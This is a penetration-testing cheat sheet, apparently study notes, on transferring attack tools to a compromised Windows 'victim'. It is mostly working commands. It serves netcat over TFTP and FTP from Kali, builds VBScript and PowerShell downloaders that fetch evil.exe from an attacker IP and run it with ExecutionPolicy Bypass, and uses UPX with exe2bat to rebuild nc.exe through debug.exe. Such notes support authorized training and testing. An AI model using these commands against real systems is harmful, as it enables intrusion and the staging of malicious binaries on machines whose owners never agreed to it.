# Uploading files to a victim

#### HTTP
+ Python:
  ```sh
  # Attacker Side
  $ python -m SimpleHTTPServer 80
  Serving HTTP on 0.0.0.0 port 80 ...

  # Victim
  wget http://192.168.100.101/exploit.exe
  ```

#### UPX
+ UPX is a portable, extendable, high-performance executable packer for several different executable formats.
+ UPX optimizes executable before uploading.


### TFTP
+ TFTP is a UDP based file transfer protocol

+ Windows operating systems up to Windows XP and 2003 contain a TFTP client, by default. In Windows 7, 2008, and above, this tool needs to be explicitly added, during installation.

+ To serve nc.exe from Kali:  
```
root@kali:~# mkdir /tftp
root@kali:~# atftpd --daemon --port 69 /tftp
root@kali:~# cp /usr/share/windows-binaries/nc.exe /tftp/
```
From victim:
```
C:\Users\Offsec>tftp -i 192.168.10.5 get nc.exe
Transfer successful: 59392 bytes in 16 second(s), 3712 bytes/s
```

### FTP
+ Windows operating systems contain a default FTP client that can also be used for file transfers.
+ ftp.exe is an interactive program.

+ From Kali
```
root@kali:~# apt-get update && apt-get install pure-ftpd
```
Then to set up:
```
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser pure-pw useradd offsec -u ftpuser -d /ftphome pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/ /etc/init.d/pure-ftpd restart
```


### Scripting languages
+ Can use scripting languages like VBScript and PowerShell.  

Example VBScript:

```VBScript
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Then on victim
```
C:\Users\Offsec>cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
```

Or on PowerShell:
```
C:\Users\Offsec> echo $storageDir = $pwd > wget.ps1
C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1 C:\Users\Offsec> echo $url = "http://192.168.10.5/evil.exe" >>wget.ps1 C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1
```
Now able to run the script and run our file:
```
C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive - NoProfile -File wget.ps1
```

### debug.exe
+ On 32 bit Windows machine, have debug.exe utility.
+ debug.exe acts as an assembler, disassembler and a hex dumping tool.
+ The concept behind the use of debug.exe for file transfers is similar to the use of scripting languages. Use non-interactive echo commands, to write out the binary file in its hex value equivalents, and then use debug.exe to assemble the written text file into a binary file.
+ There is a 64k byte size limit to the files that can be created by debug.exe.

To get the nc.exe executable ready for tansfer:
```
root@kali:~# locate nc.exe|grep binaries /usr/share/windows-binaries/nc.exe
root@kali:~# cp /usr/share/windows-binaries/nc.exe . root@kali:~# ls -l nc.exe
-rwxr-xr-x 1 root root 59392 Apr 11 05:13 nc.exe root@kali:~# upx -9 nc.exe
Ultimate Packer for eXecutables
Copyright (C) 1996 - 2011
UPX 3.08 Markus Oberhumer, Laszlo Molnar & John Reiser Dec 12th 2011
File size Ratio Format Name -------------------- ------ ----------- -----------
59392 -> 29184 49.14% win32/pe nc.exe
Packed 1 file.
root@kali:~# ls -l nc.exe
-rwxr-xr-x 1 root root 29184 Apr 11 05:13 nc.exe
```
Now that our file is optimized and ready for transfer, we can convert the nc.exe file to a text file that can be used by debug.exe, on the victim machine, to rebuild the file from text, back to an executable.
```
root@kali:~# locate exe2bat /usr/share/windows-binaries/exe2bat.exe
root@kali:~# cp /usr/share/windows-binaries/exe2bat.exe . root@kali:~# wine exe2bat.exe nc.exe nc.txt
Finished: nc.exe > nc.txt
root@kali:~# head nc.txt
echo n 1.dll >123.hex
echo e 0100 >>123.hex
echo 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 206d6f64652e0d0d0a2400000000000000 >>123.hex
echo e 0180 >>123.hex
echo 50 45 00 00 4c 01 04 00 ee 7e 66 51 00 00 00 00 00 00 00 00 e0 00 0f 03 0b 01 02 16 00 98 00 00 00 4c 00 00 00 00 00 00 00 4c 00 00 00 10 00 00 00 c0 00 00 00 00 40 00 00 10 00 00 00 02 00 00 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 30 01 00 00 04 00 00 5a 93 01 00 03 00 00 00 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 0000000000100000000000000000000000 >>123.hex
echo e 0200 >>123.hex
...
```
We now have a file called nc.txt, which can simply be copied and pasted, in the remote shell. Notice how each command executed is non interactive, and simply echo’s a bunch of hex strings, into a file. Towards the end of nc.txt, we can see the commands that rebuild the nc.exe executable, on the target machine:
```
...
echo e e900 >>123.hex echo >>123.hex
echo r cx >>123.hex echo e800 >>123.hex echo w >>123.hex
echo q >>123.hex debug<123.hex
copy 1.dll nc.exe
```
